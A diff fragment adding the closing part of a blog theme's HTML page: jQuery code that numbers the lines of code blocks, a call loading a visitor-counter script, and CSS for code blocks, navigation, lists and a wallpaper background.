+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: #fafafa;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        <!--width: 542px;-->
+        width: 270px;
+    }
+    .nav.fullscreen {
+        <!--margin-left: -542px;-->
+        margin-left: -270px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+        .nav .hide-list.fullscreen {
+            left: 492px
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+</style>
+
+
+
+
+
+
+
+
+
+</html>
